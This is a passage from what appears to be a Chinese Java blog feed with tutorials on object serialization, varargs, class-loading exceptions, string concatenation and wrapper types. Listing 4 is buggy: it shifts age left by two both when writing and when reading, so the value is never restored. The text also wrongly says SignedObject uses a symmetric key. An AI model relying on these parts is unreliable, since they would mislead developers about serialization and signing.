在原先 Person 类的基础上引入一个表示性别的新字段。</p><p><strong>清单 3. 将新字段添加到序列化的 Person 中</strong></p><pre class="line-numbers language-none"><code class="language-none">enum Gender&#123;    MALE, FEMALE&#125;public class Person    implements java.io.Serializable&#123;    public Person(String fn, String ln, int a, Gender g)    &#123;        this.firstName &#x3D; fn; this.lastName &#x3D; ln; this.age &#x3D; a; this.gender &#x3D; g;    &#125;    public String getFirstName() &#123; return firstName; &#125;    public String getLastName() &#123; return lastName; &#125;    public Gender getGender() &#123; return gender; &#125;    public int getAge() &#123; return age; &#125;    public Person getSpouse() &#123; return spouse; &#125;    public void setFirstName(String value) &#123; firstName &#x3D; value; &#125;    public void setLastName(String value) &#123; lastName &#x3D; value; &#125;    public void setGender(Gender value) &#123; gender &#x3D; value; &#125;    public void setAge(int value) &#123; age &#x3D; value; &#125;    public void setSpouse(Person value) &#123; spouse &#x3D; value; &#125;    public String toString()    &#123;        return &quot;[Person: firstName&#x3D;&quot; + firstName +             &quot; lastName&#x3D;&quot; + lastName +            &quot; gender&#x3D;&quot; + gender +            &quot; age&#x3D;&quot; + age +            &quot; spouse&#x3D;&quot; + spouse.getFirstName() +            &quot;]&quot;;    &#125;        private String firstName;    private String lastName;    private int age;    private Person spouse;    private Gender gender;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化使用一个 hash，该 hash 是根据给定源文件中几乎所有东西 — 方法名称、字段名称、字段类型、访问修改方法等 — 计算出来的，序列化将该 hash 值与序列化流中的 hash 值相比较。</p><p>为了使 Java 运行时相信两种类型实际上是一样的，第二版和随后版本的 Person 必须与第一版有相同的序列化版本 hash（存储为 private static final serialVersionUID 字段）。</p><p>因此，我们需要 serialVersionUID 字段，它是通过对原始（或 V1）版本的 Person 类运行 JDK serialver命令计算出的。</p><p>一旦有了 Person 的 serialVersionUID，不仅可以从原始对象 Person 的序列化数据创建 PersonV2 对象（当出现新字段时，新字段被设为缺省值，最常见的是“null”），还可以反过来做：即从 PersonV2 的数据通过反序列化得到 Person，这毫不奇怪。</p><h4 id="2-序列化并不安全"><a href="#2-序列化并不安全" class="headerlink" title="2. 序列化并不安全"></a>2. 序列化并不安全</h4><p>让 Java 开发人员诧异并感到不快的是，序列化二进制格式完全编写在文档中，并且完全可逆。实际上，只需将二进制序列化流的内容转储到控制台，就足以看清类是什么样子，以及它包含什么内容。</p><p>这对于安全性有着不良影响。例如，当通过 RMI 进行远程方法调用时，通过连接发送的对象中的任何 private 字段几乎都是以明文的方式出现在套接字流中，这显然容易招致哪怕最简单的安全问题。</p><p>幸运的是，序列化允许 “hook” 序列化过程，并在序列化之前和反序列化之后保护（或模糊化）字段数据。可以通过在 Serializable 对象上提供一个 writeObject 方法来做到这一点。</p><p><strong>模糊化序列化数据</strong></p><p>假设 Person 类中的敏感数据是 age 字段。毕竟，女士忌谈年龄。 我们可以在序列化之前模糊化该数据，将数位循环左移一位，然后在反序列化之后复位。（您可以开发更安全的算法，当前这个算法只是作为一个例子。）</p><p>为了 “hook” 序列化过程，我们将在 Person 上实现一个 writeObject 方法；为了 “hook” 反序列化过程，我们将在同一个类上实现一个readObject 方法。重要的是这两个方法的细节要正确 — 如果访问修改方法、参数或名称不同于清单 4 中的内容，那么代码将不被察觉地失败，Person 的 age 将暴露。</p><p><strong>清单 4. 模糊化序列化数据</strong></p><pre class="line-numbers language-none"><code class="language-none">public class Person    implements java.io.Serializable&#123;    public Person(String fn, String ln, int a)    &#123;        this.firstName &#x3D; fn; this.lastName &#x3D; ln; this.age &#x3D; a;    &#125;    public String getFirstName() &#123; return firstName; &#125;    public String getLastName() &#123; return lastName; &#125;    public int getAge() &#123; return age; &#125;    public Person getSpouse() &#123; return spouse; &#125;    public void setFirstName(String value) &#123; firstName &#x3D; value; &#125;    public void setLastName(String value) &#123; lastName &#x3D; value; &#125;    public void setAge(int value) &#123; age &#x3D; value; &#125;    public void setSpouse(Person value) &#123; spouse &#x3D; value; &#125;    private void writeObject(java.io.ObjectOutputStream stream)        throws java.io.IOException    &#123;        &#x2F;&#x2F; &quot;Encrypt&quot;&#x2F;obscure the sensitive data        age &#x3D; age &lt;&lt; 2;        stream.defaultWriteObject();    &#125;    private void readObject(java.io.ObjectInputStream stream)        throws java.io.IOException, ClassNotFoundException    &#123;        stream.defaultReadObject();        &#x2F;&#x2F; &quot;Decrypt&quot;&#x2F;de-obscure the sensitive data        age &#x3D; age &lt;&lt; 2;    &#125;    public String toString()    &#123;        return &quot;[Person: firstName&#x3D;&quot; + firstName +             &quot; lastName&#x3D;&quot; + lastName +            &quot; age&#x3D;&quot; + age +            &quot; spouse&#x3D;&quot; + (spouse!&#x3D;null ? spouse.getFirstName() : &quot;[null]&quot;) +            &quot;]&quot;;    &#125;          private String firstName;    private String lastName;    private int age;    private Person spouse;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果需要查看被模糊化的数据，总是可以查看序列化数据流&#x2F;文件。而且，由于该格式被完全文档化，即使不能访问类本身，也仍可以读取序列化流中的内容。</p><h4 id="3-序列化的数据可以被签名和密封"><a href="#3-序列化的数据可以被签名和密封" class="headerlink" title="3. 序列化的数据可以被签名和密封"></a>3. 序列化的数据可以被签名和密封</h4><p>上一个技巧假设您想模糊化序列化数据，而不是对其加密或者确保它不被修改。当然，通过使用 writeObject 和 readObject 可以实现密码加密和签名管理，但其实还有更好的方式。</p><p>如果需要对整个对象进行加密和签名，最简单的是将它放在一个 javax.crypto.SealedObject 和&#x2F;或 java.security.SignedObject 包装器中。两者都是可序列化的，所以将对象包装在 SealedObject 中可以围绕原对象创建一种“包装盒”。必须有对称密钥才能解密，而且密钥必须单独管理。同样，也可以将 SignedObject 用于数据验证，并且对称密钥也必须单独管理。</p><p>结合使用这两种对象，便可以轻松地对序列化数据进行密封和签名，而不必强调关于数字签名验证或加密的细节。很简洁，是吧？</p><h4 id="4-序列化允许将代理放在流中"><a href="#4-序列化允许将代理放在流中" class="headerlink" title="4. 序列化允许将代理放在流中"></a>4. 序列化允许将代理放在流中</h4><p>很多情况下，类中包含一个核心数据元素，通过它可以派生或找到类中的其他字段。在此情况下，没有必要序列化整个对象。可以将字段标记为 transient，但是每当有方法访问一个字段时，类仍然必须显式地产生代码来检查它是否被初始化。</p><p>如果首要问题是序列化，那么最好指定一个 flyweight 或代理放在流中。为原始 Person 提供一个 writeReplace 方法，可以序列化不同类型的对象来代替它。类似地，如果反序列化期间发现一个 readResolve 方法，那么将调用该方法，将替代对象提供给调用者。</p><p><strong>打包和解包代理</strong></p><p>writeReplace 和 readResolve 方法使 Person 类可以将它的所有数据（或其中的核心数据）打包到一个 PersonProxy 中，将它放入到一个流中，然后在反序列化时再进行解包。</p><p><strong>清单 5. 你完整了我，我代替了你</strong></p><pre class="line-numbers language-none"><code class="language-none">class PersonProxy    implements java.io.Serializable&#123;    public PersonProxy(Person orig)    &#123;        data &#x3D; orig.getFirstName() + &quot;,&quot; + orig.getLastName() + &quot;,&quot; + orig.getAge();        if (orig.getSpouse() !&#x3D; null)        &#123;            Person spouse &#x3D; orig.getSpouse();            data &#x3D; data + &quot;,&quot; + spouse.getFirstName() + &quot;,&quot; + spouse.getLastName() + &quot;,&quot;                + spouse.getAge();        &#125;    &#125;    public String data;    private Object readResolve()        throws java.io.ObjectStreamException    &#123;        String[] pieces &#x3D; data.split(&quot;,&quot;);        Person result &#x3D; new Person(pieces[0], pieces[1], Integer.parseInt(pieces[2]));        if (pieces.length &gt; 3)        &#123;            result.setSpouse(new Person(pieces[3], pieces[4], Integer.parseInt              (pieces[5])));            result.getSpouse().setSpouse(result);        &#125;        return result;    &#125;&#125;public class Person    implements java.io.Serializable&#123;    public Person(String fn, String ln, int a)    &#123;        this.firstName &#x3D; fn; this.lastName &#x3D; ln; this.age &#x3D; a;    &#125;    public String getFirstName() &#123; return firstName; &#125;    public String getLastName() &#123; return lastName; &#125;    public int getAge() &#123; return age; &#125;    public Person getSpouse() &#123; return spouse; &#125;    private Object writeReplace()        throws java.io.ObjectStreamException    &#123;        return new PersonProxy(this);    &#125;    public void setFirstName(String value) &#123; firstName &#x3D; value; &#125;    public void setLastName(String value) &#123; lastName &#x3D; value; &#125;    public void setAge(int value) &#123; age &#x3D; value; &#125;    public void setSpouse(Person value) &#123; spouse &#x3D; value; &#125;       public String toString()    &#123;        return &quot;[Person: firstName&#x3D;&quot; + firstName +             &quot; lastName&#x3D;&quot; + lastName +            &quot; age&#x3D;&quot; + age +            &quot; spouse&#x3D;&quot; + spouse.getFirstName() +            &quot;]&quot;;    &#125;        private String firstName;    private String lastName;    private int age;    private Person spouse;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，PersonProxy 必须跟踪 Person 的所有数据。这通常意味着代理需要是 Person 的一个内部类，以便能访问 private 字段。有时候，代理还需要追踪其他对象引用并手动序列化它们，例如 Person 的 spouse。</p><p>这种技巧是少数几种不需要读&#x2F;写平衡的技巧之一。例如，一个类被重构成另一种类型后的版本可以提供一个 readResolve 方法，以便静默地将被序列化的对象转换成新类型。类似地，它可以采用 writeReplace 方法将旧类序列化成新版本。</p><h4 id="5-信任，但要验证"><a href="#5-信任，但要验证" class="headerlink" title="5. 信任，但要验证"></a>5. 信任，但要验证</h4><p>认为序列化流中的数据总是与最初写到流中的数据一致，这没有问题。但是，正如一位美国前总统所说的，“信任，但要验证”。<br>对于序列化的对象，这意味着验证字段，以确保在反序列化之后它们仍具有正确的值，“以防万一”。</p><p>为此，可以实现 ObjectInputValidation接口，并覆盖 validateObject() 方法。如果调用该方法时发现某处有错误，则抛出一个 InvalidObjectException。</p><h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>Java 对象序列化比大多数 Java 开发人员想象的更灵活，这使我们有更多的机会解决棘手的情况。</p><p>幸运的是，像这样的编程妙招在 JVM 中随处可见。关键是要知道它们，在遇到难题的时候能用上它们。</p><p>来源：<a href="http://www.topthink.com/topic/11361.html">www.topthink.com/topic/11361.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Java序列化你应该知道的一切</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%85%B3%E4%BA%8EJava%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%A0%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84%E4%B8%80%E5%88%87/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%85%B3%E4%BA%8EJava%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%A0%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84%E4%B8%80%E5%88%87/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h2><p>我们的对象并不只是存在内存中，还需要传输网络，或者保存起来下次再加载出来用，所以需要Java序列化技术。</p><p>Java序列化技术正是将对象转变成一串由二进制字节组成的数组，可以通过将二进制数据保存到磁盘或者传输网络，磁盘或者网络接收者可以在对象的属类的模板上来反序列化类的对象，达到对象持久化的目的。</p><h2 id="怎么序列化一个对象？"><a href="#怎么序列化一个对象？" class="headerlink" title="怎么序列化一个对象？"></a>怎么序列化一个对象？</h2><p>要序列化一个对象，这个对象所在类就必须实现Java序列化的接口：java.io.Serializable。</p><h5 id="1、类添加序列化接口"><a href="#1、类添加序列化接口" class="headerlink" title="1、类添加序列化接口"></a>1、类添加序列化接口</h5><pre class="line-numbers language-none"><code class="language-none">import java.io.Serializable;public class User implements Serializable&#123;    private static final long serialVersionUID &#x3D; -8475669200846811112L;    private String username;    private String address;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username &#x3D; username;    &#125;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address &#x3D; address;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;username&#x3D;&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, address&#x3D;&#39;&quot; + address + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2、序列化-反序列化"><a href="#2、序列化-反序列化" class="headerlink" title="2、序列化&#x2F;反序列化"></a>2、序列化&#x2F;反序列化</h5><p>可以借助commons-lang3工具包里面的类实现对象的序列化及反序列化，你没有必要自己写。</p><pre class="line-numbers language-none"><code class="language-none">import org.apache.commons.lang3.SerializationUtils;public class Test &#123;    public static void main(String[] args) &#123;        User user &#x3D; new User();        user.setUsername(&quot;Java&quot;);        user.setAddress(&quot;China&quot;);        byte[] bytes &#x3D; SerializationUtils.serialize(user);        User u &#x3D; SerializationUtils.deserialize(bytes);        System.out.println(u);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">User&#123;username&#x3D;&#39;Java&#39;, address&#x3D;&#39;China&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上例通过序列化对象字节到内存然后反序列化，当然里面也提供了序列化磁盘然后再反序列化的方法，原理都是一样的，只是目标地不一样。</p><h2 id="序列化注意事项"><a href="#序列化注意事项" class="headerlink" title="序列化注意事项"></a>序列化注意事项</h2><ul><li><p>序列化对象必须实现序列化接口。</p></li><li><p>序列化对象里面的属性是对象的话也要实现序列化接口。</p></li><li><p>类的对象序列化后，类的序列化ID不能轻易修改，不然反序列化会失败。</p></li><li><p>类的对象序列化后，类的属性有增加或者删除不会影响序列化，只是值会丢失。</p></li><li><p>如果父类序列化了，子类会继承父类的序列化，子类无需添加序列化接口。</p></li><li><p>如果父类没有序列化，子类序列化了，子类中的属性能正常序列化，但父类的属性会丢失，不能序列化。</p></li><li><p>用Java序列化的二进制字节数据只能由Java反序列化，不能被其他语言反序列化。如果要进行前后端或者不同语言之间的交互一般需要将对象转变成Json&#x2F;Xml通用格式的数据，再恢复原来的对象。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>坑爹的 Java 可变参数，把我整得够惨。</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%9D%91%E7%88%B9%E7%9A%84%20Java%20%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%EF%BC%8C%E6%8A%8A%E6%88%91%E6%95%B4%E5%BE%97%E5%A4%9F%E6%83%A8%E3%80%82/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%9D%91%E7%88%B9%E7%9A%84%20Java%20%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%EF%BC%8C%E6%8A%8A%E6%88%91%E6%95%B4%E5%BE%97%E5%A4%9F%E6%83%A8%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p><strong>什么是可变参数？</strong></p><p>就是方法参数用 <code>Object... args</code> 三个点形式，一个参数可以接收多个参数。</p><p>实际的代码就不帖了，来看这个示例吧：</p><p><strong>示例1</strong></p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    test(&quot;name&#x3D;%s&amp;memo&#x3D;%s&quot;, &quot;Java技术&quot;, &quot;666&quot;);&#125;private static void test(String text, Object... params) &#123;    String result &#x3D; String.format(text, params);    System.out.println(result);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大家猜结果是什么？结果如我们想象：</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;Java技术&amp;memo&#x3D;666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>示例2</strong></p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    test(&quot;name&#x3D;%s&amp;memo&#x3D;%s&quot;, &quot;Java技术&quot;);&#125;private static void test(String text, Object... params) &#123;    String result &#x3D; String.format(text, params, &quot;666&quot;);    System.out.println(result);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我把 “666” 移到了子方法里面，放到了 format 最后，再来看下结果是什么。</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;[Ljava.lang.Object;@4cb2c100&amp;memo&#x3D;666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这并非是我想要的结果，把可变参数 params 数组对象地址作为值输出出来了，把我搞得够惨，最后我干掉了可变参数。。</p><p>JDK里面很多有用到可变参数的，可实际开发中，并不建议使用可变参考，它带来的困扰和潜在的问题会远大于便利性，比如在方法重构、重写等也会带来很多问题。</p><p>关于可变参数，也是有开发规范的，不能随便写。我找到了阿里巴巴的《Java开发手册》中关于可变参数的规约。</p><blockquote><p>相同参数类型，相同业务含义，才可以使用 Java 的可变参数，避免使用 Object 。</p><p>说明：可变参数必须放置在参数列表的最后。 （ 提倡同学们尽量不用可变参数编程 ）</p><p>正例： public List<User> listUsers(String type, Long… ids) {…}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的 3 种 Class 级别的错误</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%B8%B8%E8%A7%81%E7%9A%84%203%20%E7%A7%8D%20Class%20%E7%BA%A7%E5%88%AB%E7%9A%84%E9%94%99%E8%AF%AF/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%B8%B8%E8%A7%81%E7%9A%84%203%20%E7%A7%8D%20Class%20%E7%BA%A7%E5%88%AB%E7%9A%84%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="ClassNotFoundException"><a href="#ClassNotFoundException" class="headerlink" title="ClassNotFoundException"></a>ClassNotFoundException</h2><p>很明显，这个错误是<code>找不到类异常</code>，即在当前classpath路径下找不到这个类。</p><p>ClassNotFoundException继承了Exception，是必须捕获的异常，所以这个异常一般发生在显示加载类的时候，如下面两种方式显示来加载类并要捕获异常。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    try &#123;        Class.forName(&quot;com.User&quot;);    &#125; catch (ClassNotFoundException e) &#123;        e.printStackTrace();    &#125;    try &#123;        Test.class.getClassLoader().loadClass(&quot;com.User&quot;);    &#125; catch (ClassNotFoundException e) &#123;        e.printStackTrace();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当无法找到对应的类时都会抛出ClassNotFoundException异常。</p><pre class="line-numbers language-none"><code class="language-none">java.lang.ClassNotFoundException: com.Userat java.net.URLClassLoader.findClass(URLClassLoader.java:381)at java.lang.ClassLoader.loadClass(ClassLoader.java:424)at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331)at java.lang.ClassLoader.loadClass(ClassLoader.java:357)at com.test.user.Test.main(Test.java:15)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="NoClassDefFoundError"><a href="#NoClassDefFoundError" class="headerlink" title="NoClassDefFoundError"></a>NoClassDefFoundError</h2><p>这是虚拟机隐式加载类出现的异常。</p><p>这个异常继承了Error类，一般发生在引用的类不存在，即类、方法或者属性引用了某个类或者接口，如果目标引用不存在就会抛出这个异常。</p><pre class="line-numbers language-none"><code class="language-none">import org.jdom2.input.DOMBuilder;public class MyDomBuilder extends DOMBuilder&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    MyDomBuilder builder &#x3D; new MyDomBuilder();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>MyDomBuilder继承了DOMBuilder，如果把DOMBuilder所属的jar包范围设置为provided，即运行时找不到DOMBuilder类就会报错。</p><pre class="line-numbers language-none"><code class="language-none">Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: org&#x2F;jdom2&#x2F;input&#x2F;DOMBuilderat java.lang.ClassLoader.defineClass1(Native Method)at java.lang.ClassLoader.defineClass(ClassLoader.java:763)at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)at java.net.URLClassLoader.defineClass(URLClassLoader.java:467)at java.net.URLClassLoader.access$100(URLClassLoader.java:73)at java.net.URLClassLoader$1.run(URLClassLoader.java:368)at java.net.URLClassLoader$1.run(URLClassLoader.java:362)at java.security.AccessController.doPrivileged(Native Method)at java.net.URLClassLoader.findClass(URLClassLoader.java:361)at java.lang.ClassLoader.loadClass(ClassLoader.java:424)at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331)at java.lang.ClassLoader.loadClass(ClassLoader.java:357)at com.test.user.Test.main(Test.java:8)Caused by: java.lang.ClassNotFoundException: org.jdom2.input.DOMBuilderat java.net.URLClassLoader.findClass(URLClassLoader.java:381)at java.lang.ClassLoader.loadClass(ClassLoader.java:424)at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331)at java.lang.ClassLoader.loadClass(ClassLoader.java:357)... 13 more<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先报出ClassNotFoundException，然后引发NoClassDefFoundError。</p><p>所以，以上两个错误都要确保加载类或者引用类都要在classpath路径下。</p><h2 id="ClassCastException"><a href="#ClassCastException" class="headerlink" title="ClassCastException"></a>ClassCastException</h2><p>类转换异常，这个错误一般发生在一个对象强制转换类型的时候，如将一个String强制转换成Integer就会报这个错。</p><p>这个异常继承了运行时异常RuntimeException，不需要捕获的异常。为了避免报这个错，在转换之间可以先用instanceof判断下是不是该类的引用再转换。如果是集合类型，最好指定集合里面的泛型。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    Object str &#x3D; &quot;123&quot;;    Integer i &#x3D; (Integer)str;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>字符串”123”强制转换成Integer，然后报错。</p><pre class="line-numbers language-none"><code class="language-none">Exception in thread &quot;main&quot; java.lang.ClassCastException: java.lang.String cannot be cast to java.lang.Integerat com.test.user.Test.main(Test.java:9)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串拼接 + 和 concat 的区别</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%20+%20%E5%92%8C%20concat%20%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%20+%20%E5%92%8C%20concat%20%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>+和concat都可以用来拼接字符串，但在使用上有什么区别呢，先来看看这个例子。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;&#x2F;&#x2F; example1String str1 &#x3D; &quot;s1&quot;;System.out.println(str1 + 100);&#x2F;&#x2F;s1100System.out.println(100 + str1);&#x2F;&#x2F;100s1String str2 &#x3D; &quot;s2&quot;;str2 &#x3D; str2.concat(&quot;a&quot;).concat(&quot;bc&quot;);System.out.println(str2);&#x2F;&#x2F;s2abc&#x2F;&#x2F; example2String str3 &#x3D; &quot;s3&quot;;System.out.println(str3 + null);&#x2F;&#x2F;s3nullSystem.out.println(null + str3);&#x2F;&#x2F;nulls3String str4 &#x3D; null;System.out.println(str4.concat(&quot;a&quot;));&#x2F;&#x2F;NullPointerExceptionSystem.out.println(&quot;a&quot;.concat(str4));&#x2F;&#x2F;NullPointerException&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>concat源码：</p><pre class="line-numbers language-none"><code class="language-none">public String concat(String str) &#123;    int otherLen &#x3D; str.length();    if (otherLen &#x3D;&#x3D; 0) &#123;        return this;    &#125;    int len &#x3D; value.length;    char buf[] &#x3D; Arrays.copyOf(value, len + otherLen);    str.getChars(buf, len);    return new String(buf, true);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看下生成的字节码：</p><h4 id="所以可以得出以下结论："><a href="#所以可以得出以下结论：" class="headerlink" title="所以可以得出以下结论："></a>所以可以得出以下结论：</h4><ol><li><p>+可以是字符串或者数字及其他基本类型数据，而concat只能接收字符串。</p></li><li><p>+左右可以为null，concat为会空指针。</p></li><li><p>如果拼接空字符串，concat会稍快，在速度上两者可以忽略不计，如果拼接更多字符串建议用StringBuilder。</p></li><li><p>从字节码来看+号编译后就是使用了StringBuiler来拼接，所以一行+++的语句就会创建一个StringBuilder，多条+++语句就会创建多个，所以为什么建议用StringBuilder的原因。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入浅出 Java 中的包装类</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%20Java%20%E4%B8%AD%E7%9A%84%E5%8C%85%E8%A3%85%E7%B1%BB/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%20Java%20%E4%B8%AD%E7%9A%84%E5%8C%85%E8%A3%85%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-6-5/61544442.jpg"></p><h4 id="什么是包装类型"><a href="#什么是包装类型" class="headerlink" title="什么是包装类型"></a>什么是包装类型</h4><p>Java 设计当初就提供了 8 种 基本数据类型及对应的 8 种包装数据类型。我们知道 Java 是一种面向对象编程的高级语言，所以包装类型正是为了解决基本数据类型无法面向对象编程所提供的。</p><p><strong>下面是基本数据类型与对应的包装类型。</strong></p><table><thead><tr><th>基本数据类型</th><th>包装类型</th></tr></thead><tbody><tr><td>byte</td><td>Byte</td></tr><tr><td>boolean</td><td>Boolean</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>char</td><td>Character</td></tr><tr><td>int</td><td>Integer</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr></tbody></table><p><strong>下面是包装类型的继承结构图。</strong></p><p><img src="http://img.javastack.cn/18-6-5/80489463.jpg"></p><p>从以上图表可以对基本类型和包装类型有一个全面的了解。</p><h4 id="包装类应用场景"><a href="#包装类应用场景" class="headerlink" title="包装类应用场景"></a>包装类应用场景</h4><p><strong>1、集合类泛型只能是包装类；</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 编译报错List&lt;int&gt; list1 &#x3D; new ArrayList&lt;&gt;();&#x2F;&#x2F; 正常List&lt;Integer&gt; list2 &#x3D; new ArrayList&lt;&gt;();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、成员变量不能有默认值；</strong></p><pre class="line-numbers language-none"><code class="language-none">private int status;<span aria-hidden="true" 